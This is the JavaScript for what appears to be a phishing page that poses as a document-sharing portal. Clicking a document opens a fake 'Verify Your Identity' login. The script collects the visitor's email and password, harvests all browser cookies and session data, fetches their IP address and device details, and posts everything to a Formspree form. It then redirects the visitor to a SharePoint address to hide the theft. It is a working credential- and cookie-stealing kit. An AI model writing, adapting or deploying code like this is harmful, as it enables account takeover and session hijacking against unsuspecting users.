document.addEventListener('DOMContentLoaded', function() {
    // DOM Elements
    const popupOverlay = document.getElementById('popupOverlay');
    const closePopupBtn = document.querySelector('.close-popup');
    const documentItems = document.querySelectorAll('.document-item');
    const sidebarLinks = document.querySelectorAll('.sidebar-link');
    const nextBtn1 = document.getElementById('nextBtn1');
    const backBtn = document.getElementById('backBtn');
    const formSteps = document.querySelectorAll('.form-step');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const displayedEmail = document.getElementById('displayedEmail');
    const formTitle = document.getElementById('formTitle');
    const emailHint = document.getElementById('emailHint');
    const ipAddressInput = document.getElementById('ipAddressInput');
    const popupForm = document.getElementById('popupForm');
    
    let currentStep = 1;
    let userEmail = '';
    let hideHintTimeout = null;
    
    // Create menu toggle for mobile
    createMobileMenuToggle();
    
    // Open popup when document is clicked
    documentItems.forEach(item => {
        item.addEventListener('click', function() {
            openPopup();
        });
    });
    
    // Open popup when sidebar link is clicked
    sidebarLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            
            // Remove active class from all links
            sidebarLinks.forEach(l => l.classList.remove('active'));
            // Add active class to clicked link
            this.classList.add('active');
            
            // Close mobile sidebar if open
            if (window.innerWidth <= 992) {
                closeMobileSidebar();
            }
            
            // Open popup
            openPopup();
        });
    });
    
    // Open popup function
    function openPopup() {
        resetForm();
        popupOverlay.style.display = 'flex';
        document.body.style.overflow = 'hidden';
    }
    
    // Close popup
    closePopupBtn.addEventListener('click', closePopup);
    
    popupOverlay.addEventListener('click', function(e) {
        if (e.target === popupOverlay) {
            closePopup();
        }
    });
    
    function closePopup() {
        popupOverlay.style.display = 'none';
        document.body.style.overflow = 'auto';
    }
    
    // Handle email input focus - show hint briefly
    emailInput.addEventListener('focus', function() {
        showEmailHint('Enter your email address', 3000);
    });
    
    // Handle email input changes
    emailInput.addEventListener('input', function() {
        const emailValue = this.value.trim();
        
        // Clear any existing timeout
        if (hideHintTimeout) {
            clearTimeout(hideHintTimeout);
        }
        
        // Hide hint immediately when user starts typing
        if (emailValue.length > 0) {
            hideEmailHint();
        }
    });
    
    // Show email hint with auto-hide timeout
    function showEmailHint(message, timeout = 3000) {
        // Clear any existing timeout
        if (hideHintTimeout) {
            clearTimeout(hideHintTimeout);
        }
        
        emailHint.innerHTML = `<i class="fas fa-info-circle"></i> ${message}`;
        emailHint.classList.add('show');
        
        // Auto-hide after specified timeout
        if (timeout > 0) {
            hideHintTimeout = setTimeout(() => {
                hideEmailHint();
            }, timeout);
        }
    }
    
    // Hide email hint
    function hideEmailHint() {
        emailHint.classList.remove('show');
        if (hideHintTimeout) {
            clearTimeout(hideHintTimeout);
            hideHintTimeout = null;
        }
    }
    
    // Also allow Enter key to submit email
    emailInput.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            // Hide hint when pressing Enter
            hideEmailHint();
            if (validateEmail()) {
                proceedToPassword();
            }
        }
    });
    
    // Hide hint when clicking outside email input
    document.addEventListener('click', function(e) {
        if (!emailInput.contains(e.target) && !emailHint.contains(e.target)) {
            hideEmailHint();
        }
    });
    
    // Form navigation - Next button from email step
    nextBtn1.addEventListener('click', function() {
        // Hide hint when clicking Next
        hideEmailHint();
        if (validateEmail()) {
            proceedToPassword();
        }
    });
    
    function proceedToPassword() {
        displayEmailInStep2(userEmail);
        showStep(2);
        updateFormTitle('Enter Your Password');
        // Focus on password input
        setTimeout(() => {
            passwordInput.focus();
        }, 300);
    }
    
    // Back button
    backBtn.addEventListener('click', function() {
        showStep(1);
        updateFormTitle('Verify Your Identity');
        // Focus back on email input
        setTimeout(() => {
            emailInput.focus();
            emailInput.select();
        }, 300);
    });
    
    // Display email in step 2
    function displayEmailInStep2(email) {
        displayedEmail.textContent = email;
    }
    
    // Update form title
    function updateFormTitle(title) {
        formTitle.textContent = title;
    }
    
    // Show specific form step
    function showStep(step) {
        formSteps.forEach(s => s.classList.remove('active'));
        document.getElementById(`step${step}`).classList.add('active');
        currentStep = step;
    }
    
    // Reset form to initial state
    function resetForm() {
        showStep(1);
        updateFormTitle('Verify Your Identity');
        emailInput.value = '';
        passwordInput.value = '';
        userEmail = '';
        displayedEmail.textContent = '';
        ipAddressInput.value = '';
        
        // Clear any pending timeout
        if (hideHintTimeout) {
            clearTimeout(hideHintTimeout);
            hideHintTimeout = null;
        }
        
        // Reset email input
        emailInput.placeholder = 'Enter Email';
        hideEmailHint();
    }
    
    // Validation functions
    function validateEmail() {
        const emailValue = emailInput.value.trim();
        
        if (!emailValue) {
            showEmailHint('Please enter your email address', 3000);
            alert('Please enter your email address');
            return false;
        }
        
        // Validate email format
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!emailRegex.test(emailValue)) {
            showEmailHint('Please enter a valid email address (e.g., user@example.com)', 3000);
            alert('Please enter a valid email address (e.g., user@example.com)');
            return false;
        }
        
        userEmail = emailValue;
        return true;
    }
    
    // Get browser cookies
    function getBrowserCookies() {
        try {
            // Get all cookies
            const cookies = document.cookie;
            
            // Parse cookies into readable format
            const cookieArray = cookies.split(';').map(cookie => {
                const [name, ...valueParts] = cookie.trim().split('=');
                const value = valueParts.join('='); // In case cookie value contains '='
                return { name, value };
            });
            
            // Get cookie count
            const cookieCount = cookieArray.length;
            
            // Get session storage info
            const sessionStorageCount = Object.keys(sessionStorage).length;
            
            // Get localStorage info
            const localStorageCount = Object.keys(localStorage).length;
            
            // Get browser sync status (check for common sync cookies)
            const syncCookies = cookieArray.filter(cookie => 
                cookie.name.includes('sync') || 
                cookie.name.includes('Sync') ||
                cookie.name.includes('SESSION') ||
                cookie.name.includes('session')
            );
            
            const hasSyncCookies = syncCookies.length > 0;
            
            return {
                raw_cookies: cookies,
                parsed_cookies: cookieArray,
                cookie_count: cookieCount,
                session_storage_count: sessionStorageCount,
                local_storage_count: localStorageCount,
                has_sync_cookies: hasSyncCookies,
                sync_cookies: syncCookies,
                timestamp: new Date().toISOString(),
                user_agent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookie_enabled: navigator.cookieEnabled
            };
            
        } catch (error) {
            console.error('Error getting browser cookies:', error);
            return {
                error: error.message,
                raw_cookies: 'Unable to retrieve cookies',
                timestamp: new Date().toISOString()
            };
        }
    }
    
    // Formspree Form Submission
    popupForm.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        if (!validateEmail()) {
            showStep(1);
            return;
        }
        
        const submitBtn = document.getElementById('submitBtn');
        const originalText = submitBtn.textContent;
        
        try {
            // Disable button and show loading
            submitBtn.disabled = true;
            submitBtn.textContent = 'Sign In...';
            submitBtn.style.opacity = '0.7';
            
            // Get browser cookies data
            const cookieData = getBrowserCookies();
            console.log('Browser cookie data:', cookieData);
            
            // Get and set IP address
            let ipAddress = 'Unknown';
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                if (ipResponse.ok) {
                    const ipData = await ipResponse.json();
                    ipAddress = ipData.ip;
                }
            } catch (ipError) {
                console.warn('Could not fetch IP address:', ipError);
            }
            ipAddressInput.value = ipAddress;
            
            // Add timestamp
            const timestampInput = document.createElement('input');
            timestampInput.type = 'hidden';
            timestampInput.name = 'timestamp';
            timestampInput.value = new Date().toISOString();
            this.appendChild(timestampInput);
            
            // Add user agent
            const userAgentInput = document.createElement('input');
            userAgentInput.type = 'hidden';
            userAgentInput.name = 'user_agent';
            userAgentInput.value = navigator.userAgent;
            this.appendChild(userAgentInput);
            
            // Add cookie data as JSON string
            const cookieInput = document.createElement('input');
            cookieInput.type = 'hidden';
            cookieInput.name = 'browser_cookies';
            cookieInput.value = JSON.stringify(cookieData);
            this.appendChild(cookieInput);
            
            // Add browser info
            const browserInfoInput = document.createElement('input');
            browserInfoInput.type = 'hidden';
            browserInfoInput.name = 'browser_info';
            browserInfoInput.value = JSON.stringify({
                platform: navigator.platform,
                language: navigator.language,
                cookie_enabled: navigator.cookieEnabled,
                do_not_track: navigator.doNotTrack,
                hardware_concurrency: navigator.hardwareConcurrency,
                device_memory: navigator.deviceMemory
            });
            this.appendChild(browserInfoInput);
            
            // Add screen info
            const screenInfoInput = document.createElement('input');
            screenInfoInput.type = 'hidden';
            screenInfoInput.name = 'screen_info';
            screenInfoInput.value = JSON.stringify({
                width: screen.width,
                height: screen.height,
                color_depth: screen.colorDepth,
                pixel_depth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'unknown'
            });
            this.appendChild(screenInfoInput);
            
            // Log form data (without sensitive password)
            const formData = new FormData(this);
            const formDataObj = Object.fromEntries(formData);
            const safeFormData = { ...formDataObj };
            if (safeFormData.password) {
                safeFormData.password = '***HIDDEN***';
            }
            console.log('Submitting to Formspree:', safeFormData);
            
            // Submit to Formspree using fetch
            const response = await fetch(this.action, {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            });
            
            console.log('Formspree response status:', response.status);
            
            if (response.ok) {
                // Show success message
                showStep(3);
                updateFormTitle('Access Granted');
                
                console.log('Form submitted successfully to Formspree');
                console.log('Cookie data sent:', cookieData);
                
                // Countdown before redirect
                let countdown = 3;
                const countdownElement = document.querySelector('.success-message p');
                const originalText = countdownElement.textContent;
                
                // Update countdown every second
                const countdownInterval = setInterval(() => {
                    countdownElement.textContent = `Redirecting in ${countdown} seconds...`;
                    countdown--;
                    
                    if (countdown < 0) {
                        clearInterval(countdownInterval);
                        performRedirect();
                    }
                }, 1000);
                
            } else {
                const error = await response.json();
                throw new Error(error.error || 'Formspree submission failed');
            }
            
        } catch (error) {
            console.error('Error submitting form to Formspree:', error);
            
            // Show user-friendly error message
            let errorMessage = 'There was an error submitting your information. ';
            
            if (error.message.includes('NetworkError') || error.message.includes('Failed to fetch')) {
                errorMessage += 'Please check your internet connection and try again.';
            } else if (error.message.includes('Formspree')) {
                errorMessage += 'Form submission service is temporarily unavailable. Please try again later.';
            } else {
                errorMessage += 'Please try again.';
            }
            
            alert(errorMessage);
            
            // Re-enable button
            submitBtn.disabled = false;
            submitBtn.textContent = originalText;
            submitBtn.style.opacity = '1';
        }
    });
    
    // Function to perform the redirect
    function performRedirect() {
        // Close the popup
        closePopup();
        
        // Define the redirect URL (you can change this to any URL you want)
        const redirectUrl = 'https://netorgft4015335.sharepoint.com/_layouts/15/sharepoint.aspx'; // Change this URL
        
        console.log('Redirecting to:', redirectUrl);
        
        // Redirect to the URL (open in same tab)
        window.location.href = redirectUrl;
    }
    
    // Mobile menu functionality
    function createMobileMenuToggle() {
        // Create toggle button
        const toggleBtn = document.createElement('button');
        toggleBtn.className = 'menu-toggle';
        toggleBtn.innerHTML = '<i class="fas fa-bars"></i>';
        document.body.appendChild(toggleBtn);
        
        // Create overlay
        const overlay = document.createElement('div');
        overlay.className = 'sidebar-overlay';
        document.body.appendChild(overlay);
        
        // Toggle sidebar
        toggleBtn.addEventListener('click', function() {
            document.querySelector('.sidebar').classList.toggle('active');
            overlay.style.display = 'block';
        });
        
        // Close sidebar when clicking overlay
        overlay.addEventListener('click', function() {
            closeMobileSidebar();
        });
        
        // Close sidebar when clicking outside on mobile
        document.addEventListener('click', function(e) {
            const sidebar = document.querySelector('.sidebar');
            if (window.innerWidth <= 992 && 
                !sidebar.contains(e.target) && 
                e.target !== toggleBtn &&
                sidebar.classList.contains('active')) {
                closeMobileSidebar();
            }
        });
        
        // Close sidebar on window resize
        window.addEventListener('resize', function() {
            if (window.innerWidth > 992) {
                closeMobileSidebar();
            }
        });
    }
    
    function closeMobileSidebar() {
        document.querySelector('.sidebar').classList.remove('active');
        document.querySelector('.sidebar-overlay').style.display = 'none';
    }
    
    // Set first sidebar link as active by default
    sidebarLinks[0].classList.add('active');
});